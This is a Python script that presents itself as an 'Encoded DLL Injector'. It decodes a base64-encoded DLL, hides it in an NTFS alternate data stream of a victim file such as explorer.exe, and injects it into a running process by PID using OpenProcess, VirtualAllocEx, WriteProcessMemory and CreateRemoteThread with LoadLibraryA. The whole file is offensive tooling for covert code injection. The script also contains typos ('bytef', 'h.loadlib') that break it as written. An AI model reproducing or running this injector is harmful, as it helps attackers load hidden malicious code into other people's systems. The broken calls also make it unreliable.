#!/usr/bin/python
# Encoded DLL injector
# Injects encoded DLL's into a process
import sys
from ctypes import *

print "Encoded DLL Injector"
print "uses ADS streams for extra 1337'ness"
print "version 0.1."

if (len(sys.argv) != 4):
    print "Usage: %s <PID> <Path To Encoded DLL> <Path to file to use for hiding>" %(sys.argv[0])
    print "Eg: %s 1111 C:\\test\encoded.txt C:\Windows\explorer.exe" %(sys.argv[0])
    sys.exit(0)

pid = sys.argv[1]
encoded = sys.argv[2]
victim = sys.argv[3]
dropname = "exe.dll"

PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = ( 0x00F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM = ( 0x1000 | 0x2000 )

kernel32 = windll.kernel32

try:
    print "[+] Decoding the file..."
    f = open(encoded, "r")
    dllenc = f.read()
    f.close()
    dll = dllenc.decode('base64')
except Exception:
    print "[-] Something failed!"
    sys.exit(0)
try:
    print "[+] Injecting to alternate data streams!"
    hax = "%s:%s" %(victim, dropname)
    adsw = open(hax, "wb")
    adsw.write(dll)
    adsw.close()
except Exception:
    print "[-] Something has gone terribly wrong!"
    sys.exit(0)

dll_path = hax
dll_len = len(dll_path)

# Get handle to process being injected...
h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )

if not h_process:
    print "[!] Couldn't get handle to PID: %s" %(pid)
    print "[!] Are you sure %s is a valid PID?" %(pid)
    sys.exit(0)

# Allocate space for DLL path
arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

# Write DLL path to allocated space
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, bytef(written))

# Resolve LoadLibraryA Address
h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
h.loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

# Now we createRemoteThread with entrypoiny set to LoadLibraryA and pointer to DLL path as param
thread_id = c_ulong(0)

if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
    print "[!] Failed to inject DLL, exit..."
    sys.exit(0)

print "[+] Remote Thread with ID 0x%08x created." %(thread_id.value)
